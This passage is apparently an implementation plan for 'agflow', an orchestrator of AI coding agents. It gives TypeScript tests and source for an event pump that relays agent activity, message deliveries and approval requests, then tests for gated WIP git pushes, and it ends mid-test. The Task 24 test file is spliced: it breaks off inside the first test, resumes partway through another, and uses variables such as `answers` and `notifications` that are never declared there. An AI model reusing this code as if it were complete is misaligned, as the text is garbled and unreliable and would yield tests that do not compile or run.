### Task 24: The attempt controller: the event pump, deliveries and the approvals relay

The event pump turns adapter events into outbox events and facts (design 6.3, 6.7, 6.10): `attempt.activity` for tools, turns, text, compactions and vendor errors with clipped summaries, adapter warnings as notes (X-3), `attempt.first_output` for a successor's first text, and descendant snapshots at each tool start and every 5 s while tools run. `deliver` sends each message under a runner-minted id and reports `attempt.delivered` and `attempt.acknowledged` with hub message ids; message 0 and the 'more messages' line are never reported (X-4). The approvals relay lives here (X-9): `approval.requested` with the fence and the adapter's enriched detail, one notification naming core's `APPROVALS_ROUTE`, `decide_approval` answered `{ applied }` at once, and `approval.voided` for withdrawn requests.

```ts
import { afterEach, describe, expect, setDefaultTimeout, test } from 'bun:test';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import type { InjectedMessage } from '@agflow/core';
import { FakeAdapter, type FakeAdapterOptions, type FakeScript, type TranscriptLine } from '@agflow/testkit';
import type { AgentSession, VendorAdapter } from '../src/adapters/types';
import { APPROVAL_DETAIL_FIELD_MAX_BYTES, APPROVAL_NOT_FORWARDED, APPROVAL_SUMMARY_MAX } from '../src/attempt/pump';
import type { Outbox } from '../src/outbox';
import { listProcesses } from '../src/processes';
import type { Notification } from '../src/seams';
import { cleanupRunnerFixtures, createRunnerFixture, FIXTURE_PROJECT, type RunnerFixture, waitFor } from './fixture';

afterEach(cleanupRunnerFixtures);

// Every test here runs git or agent processes, which take several times as long on a machine loaded by other suites.
setDefaultTimeout(30_000);

type Sent = Parameters<AgentSession['send']>[0];

/** A fake adapter whose sessions record what the runner sends them. */
function recordingAdapter(options: FakeAdapterOptions, sent: Sent[]): VendorAdapter & { fake: FakeAdapter } {
  const fake = new FakeAdapter(options);
  return {
    fake,
    vendor: fake.vendor,
    preflight: () => fake.preflight(),
    readTranscriptTail: (input) => fake.readTranscriptTail(input),
    deleteTranscript: (input) => fake.deleteTranscript(input),
    enrichApproval: fake.enrichApproval,
    async start(launch) {
      const session = await fake.start(launch);
      const send = session.send.bind(session);
      return Object.assign(Object.create(session) as AgentSession, {
        events: session.events,
        send: async (message: Sent) => {
          sent.push(message);
          await send(message);
        },
      });
    },
  };
}

/** The fixture with one recording claude adapter playing the script. */
async function setup(script: FakeScript, more: Partial<FakeAdapterOptions> = {}) {
  const f = await createRunnerFixture();
  const sent: Sent[] = [];
  const adapter = recordingAdapter({ vendor: 'claude', skipAuthChecks: true, script, ...more }, sent);
  f.adapters.set('claude', adapter);
  return { f, sent, adapter };
}

const activities = (f: RunnerFixture) => f.events('attempt.activity').map((event) => event.data);
const turnsEnded = (f: RunnerFixture) => activities(f).filter((data) => data.kind === 'turn').length;
const messageIds = (f: RunnerFixture, type: 'attempt.delivered' | 'attempt.acknowledged') =>
  f.events(type).flatMap((event) => event.data.messageIds);
const message = (messageId: number, authority: InjectedMessage['authority'], text: string) => ({
  messageId,
  authority,
  text,
});

/** The user lines of the attempt's fake transcript so far. */
function userLines(f: RunnerFixture): string[] {
  const sessionRef = f.events('attempt.spawned')[0]?.data.sessionRef;
  const clone = f.paths.clone(FIXTURE_PROJECT, 'T-4-a1');
  const file = join(clone, '.agflow', 'run', 'fake-transcripts', `${sessionRef}.jsonl`);
  if (sessionRef === undefined || !existsSync(file)) return [];
  return readFileSync(file, 'utf8')
    .split('\n')
    .filter((line) => line !== '')
    .map((line) => JSON.parse(line) as TranscriptLine)
    .filter((line) => line.role === 'user')
    .map((line) => line.text);
}

const FENCE = { epoch: 1, counter: 1 };

describe('AttemptController: the event pump', () => {
  test('tools, turns, text, compactions, vendor errors and warnings become attempt.activity', async () => {
    const { f } = await setup({
      turns: [
        [
          { do: 'text', text: 'x'.repeat(2_000) },
          { do: 'tool', command: 'true' },
          { do: 'compacted', summary: 'the plan so far' },
          { do: 'warning', text: 'the context is nearly full' },
        ],
        [{ do: 'fail', kind: 'vendor', error: 'overloaded_error' }],
      ],
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(await controller.deliver({ fence: FENCE, messages: [message(5, 'person', 'go on')], more: 0 })).toEqual({
      ok: true,
    });
    await waitFor(() => activities(f).some((data) => data.kind === 'vendor_error'));
    const seen = activities(f);
    expect(seen.map((data) => data.kind)).toEqual(['text', 'tool', 'compaction', 'note', 'turn', 'vendor_error']);
    expect(seen[0]?.summary.length).toBeLessThanOrEqual(500);
    expect(seen[0]?.summary.startsWith('xxxx')).toBe(true);
    expect(seen.slice(1).map((data) => data.summary)).toEqual([
      'Bash: true',
      'the plan so far',
      'the context is nearly full',
      'turn completed with 1 tool call',
      'overloaded_error',
    ]);
    expect(f.events('attempt.activity')[0]?.fence).toEqual(FENCE);

      ],
    });
    const start = adapter.start.bind(adapter);
    adapter.start = async (launch) => {
      const session = await start(launch);
      const answer = session.answerApproval.bind(session);
      session.answerApproval = (approvalId, decision, reason) => {
        answers.push([approvalId, decision, reason]);
        return answer(approvalId, decision, reason);
      };
      return session;
    };
    const outbox = Object.create(f.outbox) as Outbox;
    outbox.append = (event) => {
      if (event.type === 'approval.requested') {
        throw new Error('the outbox refused a approval.requested event of 2000000 bytes: too large (1048576 max)');
      }
      return f.outbox.append(event);
    };
    const controller = f.controller('T-4-a1', { outbox, notifier: { notify: (note) => void notifications.push(note) } });
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(answers).toEqual([['vendor-request-1', 'decline', APPROVAL_NOT_FORWARDED]]);
    expect(f.events('approval.requested')).toEqual([]);
    expect(notifications).toEqual([]);
    expect(activities(f)).toContainEqual({ kind: 'note', summary: APPROVAL_NOT_FORWARDED });
    expect(f.logger.entries).toContainEqual({
      level: 'warn',
      message: 'cannot relay an approval request; it is declined',
      fields: {
        attemptId: 'T-4-a1',
        error: 'the outbox refused a approval.requested event of 2000000 bytes: too large (1048576 max)',
      },
    });
    // Nothing waits on it: the pump goes on with the next turn.
    await controller.deliver({ fence: FENCE, messages: [message(42, 'person', 'go on')], more: 0 });
    await waitFor(() => messageIds(f, 'attempt.delivered').includes(42));
    await waitFor(() => turnsEnded(f) === 2);
  });

  test('an event the runner fails to handle is logged, and the next events are handled', async () => {
    const { f } = await setup({ turns: [[{ do: 'text', text: 'first' }, { do: 'text', text: 'second' }]] });
    let refused = false;
    const outbox = Object.create(f.outbox) as Outbox;
    outbox.append = (event) => {
      if (!refused && event.type === 'attempt.activity') {
        refused = true;
        throw new Error('the outbox refused the event');
      }
      return f.outbox.append(event);
    };
    const controller = f.controller('T-4-a1', { outbox });
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(activities(f).filter((data) => data.kind === 'text')).toEqual([{ kind: 'text', summary: 'second' }]);
    expect(f.logger.entries).toContainEqual({
      level: 'error',
      message: 'cannot handle an agent event',
      fields: { attemptId: 'T-4-a1', type: 'text', error: 'the outbox refused the event' },
    });
  });

  test('decide_approval does not apply to a voided request or a dead process', async () => {
    const { f } = await setup({
      turns: [
        [{ do: 'approval', kind: 'other', summary: 'first', voidAfterMs: 100 }],
        [{ do: 'approval', kind: 'other', summary: 'second' }],
      ],
    });
    const controller = f.controller();
    await controller.start(f.spec());
    const [voided] = await waitFor(() => f.events('approval.voided').length > 0 && f.events('approval.voided'));
    const [first] = f.events('approval.requested');
    expect(voided?.data.approvalId).toBe(first?.data.approvalId as string);
    const answer = (approvalId: string) =>
      controller.decideApproval({ fence: FENCE, approvalId, decision: 'decline', reason: 'no' });
    expect(await answer(first?.data.approvalId as string)).toEqual({ applied: false });
    await controller.deliver({ fence: FENCE, messages: [message(30, 'person', 'again')], more: 0 });
    const second = await waitFor(() => f.events('approval.requested')[1]);
    const pid = controller.session?.pid as number;
    process.kill(-pid, 'SIGKILL');
    await waitFor(() => controller.session === null);
    expect(await answer(second.data.approvalId)).toEqual({ applied: false });
  });

  test('a tool start snapshots descendants and records their groups', async () => {
    const { f } = await setup({
      // exec: the tool's group leader is sleep itself, whether sh runs a lone command in its place (macOS) or not.
      turns: [[{ do: 'tool', command: 'exec sleep 30', wait: false }, { do: 'tool', command: 'true' }]],
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    const pid = controller.session?.pid as number;
    const groups = await waitFor(() => {
      const recorded = f.store.processes('T-4-a1');
      return recorded.length >= 2 && recorded;
    });
    const tool = groups.find((group) => group.pgid !== pid);
    expect(tool?.clone).toBe(groups[0]?.clone as string);
    const [row] = await listProcesses([tool?.pgid as number]);
    expect(row?.command).toBe('sleep 30');
  }, 60_000);
});
```

**File:** `packages/runner/src/attempt/pump.ts` (new)

```ts
// The event pump (design 6.3, 6.7, 6.10, 7.4): one per live agent, turning its AgentEvents into outbox events and
// phases, and carrying the hub's deliveries and approval answers to it.
// - Activity: tools, turns, text, compactions and vendor errors become attempt.activity with a clipped summary;
//   adapter warnings are notes (X-3). A successor's first assistant text is attempt.first_output.
// - Deliveries: each InjectedMessage is sent with its authority under an id of the runner's, which maps the
//   vendor's delivered and acknowledged events back to hub message ids. Message 0 (hub text) and the one line
//   about deliver.more are never reported (X-4).
// - Approvals (X-9): each vendor request gets a runner-minted UUID, held in memory with the vendor's id, and becomes
//   approval.requested with the fence and the adapter's enriched detail, its texts clipped to fit the outbox; the
//   owner gets one notification keyed by that UUID. A withdrawn request is approval.voided; decide_approval answers at once whether it applied.
//   A request the outbox refuses all the same is declined to the agent with the reason, so it never waits in vain.
// - Descendants: every tool start, and every 5 s while a tool runs, snapshots the agent's descendants and records
//   their groups, so a tool's group can be stopped even after its parent is gone.
import { randomUUID } from 'node:crypto';
import { type Approval, APPROVALS_ROUTE, type AttemptPhase, type AttemptSpec, type InjectedMessage } from '@agflow/core';
import type { AgentEvent, AgentSession, VendorAdapter } from '../adapters/types';
import type { AttemptStore } from '../attempt-store';
import type { Logger } from '../log';
import type { NewEvent } from '../outbox';
import { DescendantTracker, type ProcessIdentity } from '../processes';
import type { Notifier } from '../seams';

/** The longest attempt.activity summary: 500 characters. */
export const ACTIVITY_SUMMARY_MAX = 500;
/** The longest compaction summary and first output: 4,000 characters, as long as the handoff note quotes. */
export const LONG_TEXT_MAX = 4_000;
/** How often descendants are snapshotted while a tool runs (design 7.4). */
export const DESCENDANT_SNAPSHOT_MS = 5_000;
/** The longest approval summary: 4,000 characters. */
export const APPROVAL_SUMMARY_MAX = 4_000;
/**
 * The most bytes one approval detail field takes in the event's JSON: 64 KB, so the six fields stay far below the
 * outbox's 1 MB however the agent's text escapes. A manifest diff after an install easily passes 1 MB.
 */
export const APPROVAL_DETAIL_FIELD_MAX_BYTES = 64 * 1024;
const CLIPPED = '\n[clipped]';
/**
 * The decline reason, and the activity note, of an approval request the outbox refused: nobody can decide it, so the
 * agent hears why instead of waiting for an answer that never comes.
 */
export const APPROVAL_NOT_FORWARDED =
  'agflow declined this approval request: it was too large to forward for a decision. Ask for a smaller step.';

type AttemptEvent = Extract<NewEvent, { attemptId: string }>;
type DistributiveOmit<T, K extends PropertyKey> = T extends unknown ? Omit<T, K> : never;
/** An event of this attempt, before the controller adds its id and fence. */
export type PumpEvent = DistributiveOmit<AttemptEvent, 'attemptId' | 'fence'>;

/** Text cut to max characters, an ellipsis marking the cut. */
export function clip(text: string, max: number): string {
  return text.length <= max ? text : `${text.slice(0, max - 1)}…`;
}

/** Text cut so that its JSON takes at most maxBytes, a '[clipped]' line marking the cut. */
export function clipJsonBytes(text: string, maxBytes: number): string {
  let kept = text;
  for (;;) {
    const candidate = kept === text ? text : `${kept}${CLIPPED}`;
    const bytes = Buffer.byteLength(JSON.stringify(candidate));
    if (bytes <= maxBytes || kept === '') return candidate;
    kept = kept.slice(0, Math.floor((kept.length * maxBytes) / bytes) - CLIPPED.length);
  }
}

/** An approval's detail with every text field clipped (APPROVAL_DETAIL_FIELD_MAX_BYTES). */
export function clipApprovalDetail(detail: Approval['detail']): Approval['detail'] {
  const clipped: Approval['detail'] = {};
  for (const [key, value] of Object.entries(detail) as [keyof Approval['detail'], string | undefined][]) {
    if (value !== undefined) clipped[key] = clipJsonBytes(value, APPROVAL_DETAIL_FIELD_MAX_BYTES);
  }
  return clipped;
}

/** The line deliver.more adds (X-4). */
export function moreMessagesLine(more: number): string {
  return `${more} more agflow messages are waiting: call check_inbox`;
}

export interface EventPumpOptions {
  spec: Pick<AttemptSpec, 'attemptId' | 'successor' | 'hubUrl'>;
  session: AgentSession;
  adapter: Pick<VendorAdapter, 'enrichApproval'>;
  store: AttemptStore;
  notifier: Notifier;
  logger: Logger;
  clone: string;
  vault: string;
  startSha: string;
  /** Appends one of this attempt's events with its current fence. */
  report(event: PumpEvent): void;
  setPhase(phase: AttemptPhase): void;
  /** The agent's own recorded group, the root of every descendant snapshot. */
  root(): Promise<ProcessIdentity | null>;
  /** DESCENDANT_SNAPSHOT_MS by default. */
  snapshotEveryMs?: number;
}

export class EventPump {
  private readonly options: EventPumpOptions;
  /** Our send ids to hub message ids; null for lines that are never reported. */
  private readonly sent = new Map<string, number | null>();
  /** Pending approvals: our UUID to the vendor's id, and back. */
  private readonly approvals = new Map<string, string>();
  private readonly approvalIds = new Map<string, string>();
  private readonly tools = new Set<string>();
  private readonly descendants = new DescendantTracker();
  private snapshotTimer: ReturnType<typeof setInterval> | null = null;
  private snapshotting: Promise<void> = Promise.resolve();
  private firstOutputSent = false;
  private wroteHandoff = false;

  constructor(options: EventPumpOptions) {
    this.options = options;
  }

  /** Whether the agent wrote its handoff note (a write_handoff with a normal result). */
  get handoffWritten(): boolean {
    return this.wroteHandoff;
  }

  /** Whether a tool call is in flight. */
  get toolInFlight(): boolean {
    return this.tools.size > 0;
  }

  /** The groups descendant snapshots found, for the stop ladder. */
  groups(): ProcessIdentity[] {
    return this.descendants.groups();
  }

  /** The UUIDs of the approvals still waiting for an answer. */
  pendingApprovals(): string[] {
    return [...this.approvals.keys()];
  }

  async handle(event: AgentEvent): Promise<void> {
    const { setPhase } = this.options;
    switch (event.type) {
      case 'turn_started':
        setPhase('turn');
        return;
      case 'turn_ended':
        this.tools.clear();
        this.stopSnapshots();
        setPhase('idle');
        this.activity(...this.turnSummary(event));
        return;
      case 'tool_started':
        this.tools.add(event.toolId);
        this.activity('tool', `${event.name}: ${event.command ?? event.input}`);
        this.startSnapshots();
        return;
      case 'tool_ended':
        this.tools.delete(event.toolId);
        if (this.tools.size === 0) this.stopSnapshots();
        if (event.terminal === 'handoff') this.wroteHandoff = true;
        return;
      case 'text':
        this.activity('text', event.text);
        if (this.options.spec.successor && !this.firstOutputSent) {
          this.firstOutputSent = true;
          this.options.report({ type: 'attempt.first_output', data: { text: clip(event.text, LONG_TEXT_MAX) } });
        }
        return;
      case 'compacted':
        this.options.report({
          type: 'attempt.activity',
          data: { kind: 'compaction', summary: clip(event.summary ?? 'the context was compacted', LONG_TEXT_MAX) },
        });
        return;
      case 'warning':
        this.activity('note', event.text);
        return;
      case 'delivered':
      case 'acknowledged':
        this.reportMessage(event.type, event.id);
        return;
      case 'approval_request':
        await this.approvalRequested(event);
        return;
      case 'approval_void':
        this.voidApproval(event.approvalId);
        return;
      case 'waiting_approval':
        setPhase(event.waiting ? 'waiting_approval' : 'turn');
        return;
      default:
        return;
    }
  }

  /**
   * Sends the hub's messages in order, then one system line about the `more` that did not fit. Each send's id maps
   * back to its hub id; message 0 and the line are never reported.
   */
  async deliver(messages: readonly InjectedMessage[], more: number): Promise<void> {
    const { session } = this.options;
    for (const message of messages) {
      const id = randomUUID();
      this.sent.set(id, message.messageId > 0 ? message.messageId : null);
      await session.send({ id, text: message.text, authority: message.authority });
    }
    if (more > 0) {
      const id = randomUUID();
      this.sent.set(id, null);
      await session.send({ id, text: moreMessagesLine(more), authority: 'system' });
    }
  }

  /** Answers a pending approval; gives whether the agent took the answer. */
  async answer(approvalId: string, decision: 'approve' | 'decline', reason: string | null): Promise<boolean> {
    const vendorId = this.approvals.get(approvalId);
    if (vendorId === undefined) return false;
    const applied = await this.options.session.answerApproval(vendorId, decision, reason).catch(() => false);
    if (applied) this.forget(approvalId);
    return applied;
  }

  /** Voids every pending approval, as when the process exits. */
  voidAll(): void {
    for (const approvalId of [...this.approvals.keys()]) {
      this.forget(approvalId);
      this.options.report({ type: 'approval.voided', data: { approvalId } });
    }
  }

  /** Stops the descendant snapshots; the agent's events have ended. */
  close(): void {
    this.tools.clear();
    this.stopSnapshots();
  }

  /** Waits for a snapshot under way. */
  settled(): Promise<void> {
    return this.snapshotting;
  }

  private activity(kind: 'tool' | 'turn' | 'text' | 'vendor_error' | 'note', summary: string): void {
    this.options.report({ type: 'attempt.activity', data: { kind, summary: clip(summary, ACTIVITY_SUMMARY_MAX) } });
  }

  private turnSummary(event: Extract<AgentEvent, { type: 'turn_ended' }>): ['turn' | 'vendor_error', string] {
    if (event.outcome === 'completed') {
      return ['turn', `turn completed with ${event.toolCalls} tool call${event.toolCalls === 1 ? '' : 's'}`];
    }
    if (event.outcome === 'interrupted') return ['turn', 'turn interrupted'];
    if (event.errorKind === 'vendor') return ['vendor_error', event.error ?? 'the vendor failed the turn'];
    const kind = event.errorKind === null ? '' : ` (${event.errorKind})`;
    return ['turn', `turn failed${kind}: ${event.error ?? 'no detail'}`];
  }

  private reportMessage(type: 'delivered' | 'acknowledged', id: string): void {
    const messageId = this.sent.get(id);
    // Hub text, the deliver.more line, and ids that are not ours (a first prompt) are never reported.
    if (messageId === undefined || messageId === null) return;
    if (type === 'acknowledged') this.sent.delete(id);
    this.options.report({ type: `attempt.${type}`, data: { messageIds: [messageId] } });
  }

  private async approvalRequested(event: Extract<AgentEvent, { type: 'approval_request' }>): Promise<void> {
    const { adapter, spec, logger } = this.options;
    const approvalId = randomUUID();
    this.approvals.set(approvalId, event.approvalId);
    this.approvalIds.set(event.approvalId, approvalId);
    const request = { kind: event.kind, summary: event.summary, detail: event.detail };
    let detail = event.detail;
    if (adapter.enrichApproval) {
      try {
        detail = await adapter.enrichApproval({
          clone: this.options.clone,
          vault: this.options.vault,
          startSha: this.options.startSha,
          request,
        });
      } catch (error) {
        logger.warn('cannot enrich an approval request', { attemptId: spec.attemptId, error: String(error) });
      }
    }
    // Withdrawn while it was enriched: nothing to relay.
    if (!this.approvals.has(approvalId)) return;
    // The agent and the adapter write these: clipped, so the event always fits the outbox.
    const summary = clip(event.summary, APPROVAL_SUMMARY_MAX);
    try {
      this.options.report({
        type: 'approval.requested',
        data: { approvalId, kind: event.kind, summary, detail: clipApprovalDetail(detail) },
      });
    } catch (error) {
      // The outbox refused it all the same: declined at once, so the agent goes on.
      logger.warn('cannot relay an approval request; it is declined', {
        attemptId: spec.attemptId,
        error: error instanceof Error ? error.message : String(error),
      });
      this.forget(approvalId);
      await this.options.session.answerApproval(event.approvalId, 'decline', APPROVAL_NOT_FORWARDED).catch(() => false);
      this.activity('note', APPROVAL_NOT_FORWARDED);
      return;
    }
    const hub = spec.hubUrl.replace(/\/+$/, '');
    try {
      await this.options.notifier.notify({
        key: approvalId,
        title: `agflow: ${spec.attemptId} asks for your approval`,
        body: `${summary}\n${hub}${APPROVALS_ROUTE}`,
      });
    } catch (error) {
      logger.warn('cannot post the approval notification', { attemptId: spec.attemptId, error: String(error) });
    }
  }

  private voidApproval(vendorId: string): void {
    const approvalId = this.approvalIds.get(vendorId);
    if (approvalId === undefined) return;
    this.forget(approvalId);
    this.options.report({ type: 'approval.voided', data: { approvalId } });
  }

  private forget(approvalId: string): void {
    const vendorId = this.approvals.get(approvalId);
    this.approvals.delete(approvalId);
    if (vendorId !== undefined) this.approvalIds.delete(vendorId);
  }

  /** A snapshot now, and every snapshotEveryMs while a tool runs. */
  private startSnapshots(): void {
    this.snapshot();
    if (this.snapshotTimer !== null) return;
    this.snapshotTimer = setInterval(() => this.snapshot(), this.options.snapshotEveryMs ?? DESCENDANT_SNAPSHOT_MS);
    this.snapshotTimer.unref?.();
  }

  private stopSnapshots(): void {
    if (this.snapshotTimer !== null) clearInterval(this.snapshotTimer);
    this.snapshotTimer = null;
  }

  /** One snapshot at a time; each records the groups found in the attempt's registry. */
  private snapshot(): void {
    this.snapshotting = this.snapshotting.then(async () => {
      try {
        const root = await this.options.root();
        if (root === null) return;
        await this.descendants.snapshot([root]);
        for (const group of this.descendants.groups()) {
          this.options.store.recordProcess({
            attemptId: this.options.spec.attemptId,
            pid: group.pid,
            pgid: group.pgid,
            lstart: group.lstart,
            clone: this.options.clone,
          });
        }
      } catch (error) {
        this.options.logger.warn('a descendant snapshot failed', {
          attemptId: this.options.spec.attemptId,
          error: String(error),
        });
      }
    });
  }
}
```

- [ ] **Step 4: Run the tests and see them pass**

Run: `bun test packages/runner/test/controller-pump.test.ts packages/runner/test/controller-workspace.test.ts && bun test && bun run typecheck`
Expected: the task's tests pass; then the whole suite passes (`0 fail`) and `tsc` exits 0.

`deliver`, `interrupt` and `decideApproval` act at once, never on the queue. Their refusals are `stale_fence` and `not_running`, the literals on which the hub frees a delivery's rows. If the outbox refuses an `approval.requested`, the pump declines that approval with `APPROVAL_NOT_FORWARDED` and reports a note, so the agent never waits forever. The test 'a tool start snapshots descendants and records their groups' has a 60 s timeout, and its tool runs `exec sleep 30`, so `sleep` leads the tool's group whether the shell runs a lone command in its place (macOS) or not (dash on Linux).

### Task 25: The attempt controller: WIP pushes and canPushWip

`collectWork` runs harvest, snapshot, the restore base and strip for a clone, and `canPushWip` decides every push to a WIP ref (design 7.3, X-11): a welcome since the last clock gap, an attempt not known fenced, ended or exited, and an ack younger than `wipGraceMs`. The WIP timer pushes a worker's changed clone every `wip` interval, leased on the previous WIP sha, and reports `attempt.wip` (with `logStat` clipped to 4,000 characters), `attempt.violation` phase `wip` for newly stripped paths, or `attempt.wip_failed` with the runner's consecutive failures (X-3). A push the gate forbids waits in the vault and goes after the next welcome, and a start in an existing clone first pushes that clone's work. Leads are never harvested.

```ts
import { afterEach, describe, expect, setDefaultTimeout, test } from 'bun:test';
import { existsSync, mkdirSync, mkdtempSync, renameSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { localPinRefs } from '@agflow/core';
import { commitFiles, gitIn, originRepo } from '@agflow/testkit';
import { canPushWip, wipGateOf, withPausedGroups } from '../src/attempt/work';
import { runGit } from '../src/git/run';
import { listProcesses, processIdentity } from '../src/processes';
import { cleanupRunnerFixtures, createRunnerFixture, FIXTURE_PROJECT, type RunnerFixture, waitFor } from './fixture';

afterEach(cleanupRunnerFixtures);

// Every test here runs git or agent processes, which take several times as long on a machine loaded by other suites.
setDefaultTimeout(30_000);

const WIP = 'refs/agflow/T-4/a1';
const FENCE = { epoch: 1, counter: 1 };

/** The ref's sha on the origin, or null. */
const originRef = (f: RunnerFixture, ref: string) =>
  gitIn(f.origin.path, ['rev-parse', '--verify', '--quiet', ref], { allowFailure: true }).then((sha) => sha || null);

/** A commit's files on the origin, as `mode path` lines. */
async function originFiles(f: RunnerFixture, sha: string): Promise<string[]> {
  const listed = await gitIn(f.origin.path, ['ls-tree', '-r', '--full-tree', sha]);
  return listed.split('\n').map((line) => `${line.slice(0, 6)} ${line.slice(line.indexOf('\t') + 1)}`);
}

function write(dir: string, files: Record<string, string>): void {
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), content);
  }
}

const turnsEnded = (f: RunnerFixture) =>
  f.events('attempt.activity').filter((event) => event.data.kind === 'turn').length;

describe('canPushWip', () => {
  const gate = (welcomeSinceGap: boolean, ackAgeMs: number | null, wipGraceMs: number | null) => ({
    welcomeSinceGap: () => welcomeSinceGap,
    ackAgeMs: () => ackAgeMs,
    wipGraceMs: () => wipGraceMs,
  });
  const live = { fenced: false, ended: false, exited: false };

  test('holds after a welcome since the last gap, with a fresh ack, for an attempt still current', () => {
    expect(canPushWip(gate(true, 1_000, 300_000), live)).toBe(true);
    expect(canPushWip(gate(false, 1_000, 300_000), live)).toBe(false);
    expect(canPushWip(gate(true, 300_000, 300_000), live)).toBe(false);
    expect(canPushWip(gate(true, null, null), live)).toBe(false);
    for (const known of ['fenced', 'ended', 'exited'] as const) {
      expect(canPushWip(gate(true, 1_000, 300_000), { ...live, [known]: true })).toBe(false);
    }
  });

  test("reads the link's welcome since the gap, its last ack on the awake clock and welcome's grace", () => {
    let now = 50_000;
    const link = {
      welcomeSinceGap: true,
      lastAckAt: 40_000 as number | null,
      welcome: { timings: { heartbeatMs: 15_000, deadLinkMs: 45_000, handoffMs: 180_000, wipGraceMs: 300_000 } },
    };
    const wipGate = wipGateOf(link, { awakeNow: () => now });
    expect([wipGate.welcomeSinceGap(), wipGate.ackAgeMs(), wipGate.wipGraceMs()]).toEqual([true, 10_000, 300_000]);
    now = 60_000;
    link.lastAckAt = null;
    expect(wipGate.ackAgeMs()).toBeNull();
  });
});

describe('withPausedGroups', () => {
  test('stops the groups while the work runs and lets them go on after it, even when it fails', async () => {
    const proc = Bun.spawn(['sleep', '30'], { detached: true, stdin: 'ignore', stdout: 'ignore', stderr: 'ignore' });
    try {
      const identity = await processIdentity(proc.pid);
      if (identity === null) throw new Error('sleep is gone');
      const state = async () => (await listProcesses([proc.pid]))[0]?.stat ?? '';
      await expect(
        withPausedGroups([identity], async () => {
          expect(await state()).toStartWith('T');
          throw new Error('the harvest failed');
        }),
      ).rejects.toThrow('the harvest failed');
      expect(await state()).not.toStartWith('T');
    } finally {
      proc.kill('SIGKILL');
    }
  });
});

describe('AttemptController: WIP pushes', () => {
  test('the timer pushes changed work with a clipped logStat, stripping protected changes once reported', async () => {
    const f = await createRunnerFixture({
      config: { timings: { wip: 400 } },
      script: {
        turns: [
          [
            { do: 'write', path: 'a.txt', content: 'a\n' },
            { do: 'commit', message: 'add a' },
            { do: 'write', path: '.claude/settings.json', content: '{"evil":true}\n' },
            { do: 'tool', command: 'for i in $(seq 1 300); do echo $i > "file-$i.txt"; done' },
          ],
          [{ do: 'write', path: 'b.txt', content: 'b\n' }],
        ],
      },
    });
    const controller = f.controller();
    // Keep the real interval, but release one timer job at a time. No tick may harvest half a scripted turn,
    // and a slow harvest must not accumulate more queued jobs while the assertions inspect its result.
    type Outcome = Awaited<ReturnType<typeof controller.pushWip>>;
    let nextTick: { resolve(value: Outcome): void; reject(reason: unknown): void } | null = null;
    const onNextTick = () => {
      const tick = Promise.withResolvers<Outcome>();
      nextTick = tick;
      return tick.promise;
    };
    const pushWip = controller.pushWip.bind(controller);
    controller.pushWip = () => {
      const tick = nextTick;
      if (tick === null) return Promise.resolve({ status: 'skipped' });
      nextTick = null;
      const pushed = pushWip();
      void pushed.then(tick.resolve, tick.reject);
      return pushed;
    };
    try {
      await controller.start(f.spec());
      await waitFor(() => turnsEnded(f) === 1);
      expect(await onNextTick()).toMatchObject({ status: 'pushed' });
      const [wip] = f.events('attempt.wip');
      expect(wip?.fence).toEqual(FENCE);
      expect(wip?.data).toMatchObject({ ref: WIP, stripped: ['.claude/settings.json'], skipped: [], embedded: [] });
      expect(wip?.data.logStat.length).toBeLessThanOrEqual(4_000);
      expect(wip?.data.logStat).toContain('agflow: uncommitted work at');
      const pushed = wip?.data.sha as string;
      expect(await originRef(f, WIP)).toBe(pushed);
      const files = await originFiles(f, pushed);
      expect(files).toContain('100644 a.txt');
      expect(files).toContain('100644 file-300.txt');
      expect(files.some((line) => line.includes('.claude'))).toBe(false);
      expect(f.events('attempt.violation').map((event) => event.data)).toEqual([
        { phase: 'wip', paths: ['.claude/settings.json'] },
      ]);
      expect(f.store.get('T-4-a1')).toMatchObject({ pushedSha: pushed, wipSha: pushed });

      // The next timer job finishes with no changed work and produces no push.
      expect(await onNextTick()).toEqual({ status: 'unchanged' });
      expect(f.events('attempt.wip')).toHaveLength(1);
      // A change is pushed on the next tick, leased on the previous WIP; the violation is not reported again.
      await controller.deliver({ fence: FENCE, messages: [{ messageId: 7, authority: 'person', text: 'more' }], more: 0 });
      await waitFor(() => turnsEnded(f) === 2);
      expect(await onNextTick()).toMatchObject({ status: 'pushed' });
      const second = f.events('attempt.wip')[1]!;
      expect(await originFiles(f, second.data.sha)).toContain('100644 b.txt');
      expect(await originRef(f, WIP)).toBe(second.data.sha);
      expect(f.events('attempt.violation')).toHaveLength(1);
    } finally {
      await controller.session?.close();
      await controller.settled();
    }
  }, 60_000);

  test('failing WIP pushes of two attempts count 1, 2 and 3 across them; a success resets the count', async () => {
    const script = { turns: [[{ do: 'write' as const, path: 'work.txt', content: 'work\n' }]] };
    const f = await createRunnerFixture({ script });
    const a = f.controller('T-4-a1');
    const b = f.controller('T-5-a1');
    await a.start(f.spec());
    await b.start(f.spec({ attemptId: 'T-5-a1', taskId: 'T-5', branch: 'agflow/T-5-other', wipRef: 'refs/agflow/T-5/a1' }));
    await waitFor(() => turnsEnded(f) === 2);
    const setOrigin = (url: string) =>
      runGit(f.local, [`--git-dir=${f.vault.path}`, 'config', 'remote.origin.url', url]);
    await setOrigin(join(f.home, 'no-such-origin'));
    expect(await a.pushWip()).toMatchObject({ status: 'failed' });
    expect(await b.pushWip()).toMatchObject({ status: 'failed' });
    expect(await a.pushWip()).toMatchObject({ status: 'failed' });
    expect(f.events('attempt.wip_failed').map((event) => [event.attemptId, event.data.failures])).toEqual([
      ['T-4-a1', 1],
      ['T-5-a1', 2],
      ['T-4-a1', 3],
    ]);
    await setOrigin(f.origin.path);
    expect(await b.pushWip()).toMatchObject({ status: 'pushed' });
    await setOrigin(join(f.home, 'no-such-origin'));
    expect(await a.pushWip()).toMatchObject({ status: 'failed' });
    expect(f.events('attempt.wip_failed').at(-1)?.data.failures).toBe(1);
  });

  test('after a gap nothing is pushed until a welcome; an outage pushes only within the grace', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
